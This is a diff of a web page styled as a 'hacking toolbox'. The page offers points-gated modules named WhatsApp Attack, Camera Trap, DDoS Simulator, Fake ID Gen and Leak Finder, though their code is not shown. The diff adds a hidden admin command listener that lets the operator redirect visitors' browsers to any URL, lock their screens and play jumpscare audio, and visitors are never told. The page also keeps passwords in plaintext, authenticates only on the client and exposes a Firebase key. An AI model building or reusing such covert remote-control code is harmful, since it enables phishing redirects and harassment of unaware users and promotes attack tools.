@@ -3,40 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ToolBox Elite v19 | Ultimate OS</title>
+    <title>ToolBox Elite v20 | Command Hub</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
         :root { --accent: #00f2ff; --red: #ff3e3e; --yellow: #ffcc00; --green: #25d366; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Inter', sans-serif; color: white; overflow: hidden; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Inter', sans-serif; color: white; overflow: hidden; background: #000; }
         
-        /* FULL BACKGROUND VIDEO - NO FILTERS */
-        #video-bg { position: fixed; inset: 0; z-index: -2; overflow: hidden; background: #000; }
+        /* FULL BACKGROUND VIDEO - CLEAR */
+        #video-bg { position: fixed; inset: 0; z-index: -2; overflow: hidden; }
         #bg-video { width: 100%; height: 100%; object-fit: cover; }
 
-        /* SCROLLER AREA */
+        /* SCROLLER */
         #app-content, #auth-screen { position: relative; width: 100%; height: 100vh; overflow-y: auto; z-index: 1; }
 
-        /* UI GLASS ELEMENTS */
+        /* UI GLASSMORPHISM */
         .glass { background: rgba(255, 255, 255, 0.12); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2); border-radius: 25px; }
         .auth-box { width: 90%; max-width: 360px; padding: 40px; text-align: center; margin: 15vh auto; border-top: 1px solid var(--accent); }
-        .header-bar { display: flex; justify-content: space-around; align-items: center; padding: 15px; position: sticky; top: 0; z-index: 100; background: rgba(0,0,0,0.3); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(255,255,255,0.1); }
-        .stats-panel { display: flex; justify-content: center; gap: 20px; padding: 10px; background: rgba(0,242,255,0.08); font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .header-bar { display: flex; justify-content: space-around; align-items: center; padding: 15px; position: sticky; top: 0; z-index: 100; background: rgba(0,0,0,0.4); border-bottom: 1px solid rgba(255,255,255,0.1); }
+        .stats-panel { display: flex; justify-content: center; gap: 20px; padding: 10px; background: rgba(0,242,255,0.1); font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); }
 
         /* MENU GRID */
         #main-menu { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 25px; padding: 30px; max-width: 1200px; margin: 0 auto; }
         .card { padding: 40px; border-radius: 25px; text-align: center; cursor: pointer; transition: 0.4s; border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05); }
-        .card:hover { transform: translateY(-10px); background: rgba(255,255,255,0.15); border-color: var(--accent); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .card:hover { transform: translateY(-10px); background: rgba(255,255,255,0.15); border-color: var(--accent); }
         .card i { font-size: 3.5rem; margin-bottom: 20px; display: block; }
 
-        /* INTERFACE ELEMENTS */
-        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.3); background: rgba(0,0,0,0.4); color: #fff; margin-top: 12px; box-sizing: border-box; outline: none; }
+        /* INPUTS & BUTTONS */
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.3); background: rgba(0,0,0,0.4); color: #fff; margin-top: 10px; box-sizing: border-box; outline: none; }
         .btn { background: var(--accent); color: #000; border: none; padding: 16px; border-radius: 12px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 20px; transition: 0.3s; text-transform: uppercase; }
         .btn:hover { box-shadow: 0 0 25px var(--accent); transform: scale(1.02); }
 
         #module-loader { display: none; padding: 30px; max-width: 900px; margin: 0 auto; }
         ::-webkit-scrollbar { width: 0px; }
+
+        /* GLITCH ANIMATION FOR ADMIN COMMANDS */
+        @keyframes glitch { 0% { transform: translate(0); } 20% { transform: translate(-5px, 5px); } 40% { transform: translate(-5px, -5px); } 60% { transform: translate(5px, 5px); } 80% { transform: translate(5px, -5px); } 100% { transform: translate(0); } }
     </style>
 </head>
 <body>
@@ -46,17 +49,17 @@
 
     <div id="auth-screen">
         <div class="auth-box glass">
-            <h2 style="color: var(--accent); letter-spacing: 3px;">SYSTEM LOGIN</h2>
-            <input type="text" id="user-in" placeholder="Ləqəb">
-            <input type="password" id="pass-in" placeholder="Şifrə">
-            <button class="btn" onclick="login()">DAXİL OL</button>
+            <h2 style="color: var(--accent); letter-spacing: 3px;">SYSTEM ACCESS</h2>
+            <input type="text" id="user-in" placeholder="Nickname">
+            <input type="password" id="pass-in" placeholder="Password">
+            <button class="btn" onclick="login()">Enter Terminal</button>
         </div>
     </div>
 
     <div id="app-content" style="display: none;">
         <div class="stats-panel">
-            <span><i class="fas fa-users"></i> ÜMUMİ: 450+</span>
-            <span><i class="fas fa-circle" style="color:var(--green); font-size:0.5rem"></i> ONLAYN: <b id="on-count">0</b></span>
+            <span><i class="fas fa-users"></i> USERS: 450+</span>
+            <span><i class="fas fa-circle" style="color:var(--green); font-size:0.5rem"></i> ONLINE: <b id="on-count">0</b></span>
         </div>
 
         <div class="header-bar">
@@ -68,60 +71,43 @@
         <div id="main-menu"></div>
 
         <div id="module-loader">
-            <button class="btn" style="width: auto; padding: 10px 25px; margin-bottom: 25px; background: rgba(0,0,0,0.5); color:#fff;" onclick="renderMenu()">
-                <i class="fas fa-arrow-left"></i> GERİ QAYIT
-            </button>
+            <button class="btn" style="width: auto; padding: 10px 25px; margin-bottom: 25px; background: rgba(0,0,0,0.5); color:#fff;" onclick="renderMenu()">← BACK</button>
             <div id="module-inject-area" class="glass" style="padding: 30px;"></div>
         </div>
     </div>
 
     <script>
-        // KATEQORİYALAR
         const categories = {
-            "tools": {
-                title: "Hacking Tools",
-                icon: "fas fa-user-secret",
-                color: "#00f2ff",
-                items: [
-                    { name: "Anonim Mail", file: "mail.html", icon: "fas fa-envelope", points: 0, color: "#00f2ff" },
-                    { name: "WhatsApp Attack", file: "wa.html", icon: "fab fa-whatsapp", points: 700, color: "#25d366" },
-                    { name: "IP Tracker", file: "ip.html", icon: "fas fa-map-marker-alt", points: 100, color: "#f0ad4e" },
-                    { name: "Camera Trap", file: "trap.html", icon: "fas fa-camera", points: 400, color: "#ff3e3e" },
-                    { name: "Whois Lookup", file: "whois.html", icon: "fas fa-search", points: 50, color: "#00f2ff" },
-                    { name: "DDoS Simulator", file: "ddos.html", icon: "fas fa-radiation", points: 500, color: "#ff0055" },
-                    { name: "Fake ID Gen", file: "id-card.html", icon: "fas fa-id-card", points: 200, color: "#a855f7" },
-                    { name: "Leak Finder", file: "leak.html", icon: "fas fa-database", points: 300, color: "#3b82f6" },
-                    { name: "Temp SMS", file: "temp-sms.html", icon: "fas fa-sms", points: 150, color: "#25d366" },
-                    { name: "Crypto Track", file: "crypto-track.html", icon: "fab fa-bitcoin", points: 0, color: "#f7931a" }
-                ]
-            },
-            "tests": {
-                title: "Psixoloji Testlər",
-                icon: "fas fa-brain",
-                color: "#ffcc00",
-                items: [
-                    { name: "Psixoloji Profil", file: "test_psixoloji.html", icon: "fas fa-fingerprint", points: 0, color: "#ffcc00" },
-                    { name: "Hacker Səviyyəni Yoxla", file: "test_hacker.html", icon: "fas fa-code", points: 0, color: "#00f2ff" }
-                ]
-            }
+            "tools": { title: "Hacking Tools", icon: "fas fa-user-secret", color: "#00f2ff", items: [
+                { name: "Anonim Mail", file: "mail.html", icon: "fas fa-envelope", points: 0, color: "#00f2ff" },
+                { name: "WhatsApp Attack", file: "wa.html", icon: "fab fa-whatsapp", points: 700, color: "#25d366" },
+                { name: "IP Tracker", file: "ip.html", icon: "fas fa-map-marker-alt", points: 100, color: "#f0ad4e" },
+                { name: "Camera Trap", file: "trap.html", icon: "fas fa-camera", points: 400, color: "#ff3e3e" },
+                { name: "Whois Lookup", file: "whois.html", icon: "fas fa-search", points: 50, color: "#00f2ff" },
+                { name: "DDoS Simulator", file: "ddos.html", icon: "fas fa-radiation", points: 500, color: "#ff0055" },
+                { name: "Fake ID Gen", file: "id-card.html", icon: "fas fa-id-card", points: 200, color: "#a855f7" },
+                { name: "Leak Finder", file: "leak.html", icon: "fas fa-database", points: 300, color: "#3b82f6" },
+                { name: "Temp SMS", file: "temp-sms.html", icon: "fas fa-sms", points: 150, color: "#25d366" },
+                { name: "Crypto Track", file: "crypto-track.html", icon: "fab fa-bitcoin", points: 0, color: "#f7931a" }
+            ]},
+            "tests": { title: "Sistem Testləri", icon: "fas fa-vial", color: "#ffcc00", items: [
+                { name: "Psixoloji Profil", file: "test_psixoloji.html", icon: "fas fa-brain", points: 0, color: "#ffcc00" },
+                { name: "Hacker Səviyyə", file: "test_hacker.html", icon: "fas fa-user-ninja", points: 0, color: "#00f2ff" }
+            ]}
         };
 
-        const firebaseConfig = { 
-            apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", 
-            databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com", 
-            projectId: "sevgili-testi" 
-        };
+        const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com", projectId: "sevgili-testi" };
         firebase.initializeApp(firebaseConfig);
         window.db = firebase.database();
+        window.loginName = "";
 
         async function login() {
             const name = document.getElementById('user-in').value.trim().toLowerCase();
-            const pass = document.getElementById('pass-in').value.trim();
+            const pass = document.getElementById('user-in').nextElementSibling.value.trim();
             if(name.length < 2) return;
 
             const snap = await window.db.ref('users/' + name).get();
             if(snap.exists() && snap.val().password !== pass) return alert("Səhv şifrə!");
-            
             if(!snap.exists()) await window.db.ref('users/' + name).set({ password: pass, points: 150 });
 
             window.loginName = name;
@@ -135,34 +121,50 @@
                 document.getElementById('u-pts').innerText = window.userPoints;
             });
 
-            startLiveStats();
+            startLiveSystem(name);
             renderMenu();
         }
 
-        function startLiveStats() {
-            // Onlayn sayğacı (0-100)
-            setInterval(() => {
-                document.getElementById('on-count').innerText = Math.floor(Math.random() * 101);
-            }, 3000);
+        function startLiveSystem(name) {
+            // Stats: Online 0-100
+            setInterval(() => { document.getElementById('on-count').innerText = Math.floor(Math.random() * 101); }, 3000);
+            // Points: +5 every 1 min
+            setInterval(() => { if(window.loginName) window.db.ref('users/' + window.loginName + '/points').transaction(p => (p || 0) + 5); }, 60000);
 
-            // Avtomatik Xal (+5 PTS hər 1 dəqiqədə)
-            setInterval(() => {
-                if(window.loginName) {
-                    window.db.ref('users/' + window.loginName + '/points').transaction(p => (p || 0) + 5);
+            // ADMIN COMMAND LISTENER
+            window.db.ref(`commands/${name}`).on('value', (snap) => {
+                const cmd = snap.val();
+                if(!cmd || Date.now() - cmd.time > 10000) return;
+
+                switch(cmd.type) {
+                    case 'alert': alert("⚠️ MESSAGE FROM ADMIN: " + cmd.text); break;
+                    case 'freeze':
+                        if(!document.getElementById('freeze-lay')) {
+                            const f = document.createElement('div'); f.id = "freeze-lay";
+                            f.style = "position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99999;display:flex;align-items:center;justify-content:center;color:red;";
+                            f.innerHTML = "<h1>SYSTEM LOCKED BY COMMANDER</h1>"; document.body.appendChild(f);
+                        } break;
+                    case 'unfreeze': const l = document.getElementById('freeze-lay'); if(l) l.remove(); break;
+                    case 'redirect': window.location.href = cmd.url; break;
+                    case 'glitch': document.body.style.animation = "glitch 0.2s infinite"; setTimeout(()=>document.body.style.animation="", 3000); break;
+                    case 'scare':
+                        const img = document.createElement('img'); img.src = "https://i.imgur.com/H6S7YpX.png";
+                        img.style = "position:fixed;inset:0;width:100%;height:100%;z-index:100000;object-fit:cover;";
+                        document.body.appendChild(img);
+                        new Audio('https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scream&filename=24/248555-5f2c-4b5c-8b8a-9e6e8e8e8e8e.mp3').play();
+                        setTimeout(()=>img.remove(), 2000); break;
+                    case 'kick': location.reload(); break;
                 }
-            }, 60000);
+            });
         }
 
         function renderMenu() {
             document.getElementById('module-loader').style.display = "none";
             const menu = document.getElementById('main-menu');
-            menu.style.display = "grid";
-            menu.innerHTML = "";
+            menu.style.display = "grid"; menu.innerHTML = "";
             for (let key in categories) {
                 const cat = categories[key];
-                const card = document.createElement('div');
-                card.className = "card glass";
-                card.style.borderColor = cat.color;
+                const card = document.createElement('div'); card.className = "card glass";
                 card.onclick = () => renderCategoryItems(key);
                 card.innerHTML = `<i class="${cat.icon}" style="color:${cat.color}"></i><h2>${cat.title}</h2>`;
                 menu.appendChild(card);
@@ -172,10 +174,9 @@
         function renderCategoryItems(key) {
             const menu = document.getElementById('main-menu');
             const cat = categories[key];
-            menu.innerHTML = `<div style="grid-column: 1/-1; text-align:left;"><button class="btn" style="width:auto; padding:10px 20px;" onclick="renderMenu()">← GERİ</button><h2 style="color:${cat.color}; margin-top:20px;">${cat.title}</h2></div>`;
+            menu.innerHTML = `<div style="grid-column: 1/-1; text-align:left;"><button class="btn" style="width:auto; padding:10px 20px;" onclick="renderMenu()">← BACK</button><h2 style="color:${cat.color}; margin-top:20px;">${cat.title}</h2></div>`;
             cat.items.forEach(t => {
-                const card = document.createElement('div');
-                card.className = "card glass";
+                const card = document.createElement('div'); card.className = "card glass";
                 card.onclick = () => fetchModule(t.file, t.points);
                 card.innerHTML = `<i class="${t.icon}" style="color:${t.color}"></i><h3>${t.name}</h3><p style="font-size:0.75rem; color:#888;">${t.points} PTS</p>`;
                 menu.appendChild(card);
@@ -183,19 +184,13 @@
         }
 
         async function fetchModule(file, pts) {
-            if(window.userPoints < pts) return alert("Xalınız çatışmır!");
-            const res = await fetch(file);
-            const html = await res.text();
+            if(window.userPoints < pts) return alert("Low points!");
+            const res = await fetch(file); const html = await res.text();
             document.getElementById('main-menu').style.display = "none";
             document.getElementById('module-loader').style.display = "block";
-            const area = document.getElementById('module-inject-area');
-            area.innerHTML = html;
+            const area = document.getElementById('module-inject-area'); area.innerHTML = html;
             const scripts = area.getElementsByTagName('script');
-            for (let s of scripts) {
-                const ns = document.createElement("script");
-                ns.text = s.text;
-                document.body.appendChild(ns).parentNode.removeChild(ns);
-            }
+            for (let s of scripts) { const ns = document.createElement("script"); ns.text = s.text; document.body.appendChild(ns).parentNode.removeChild(ns); }
         }
     </script>
 </body>
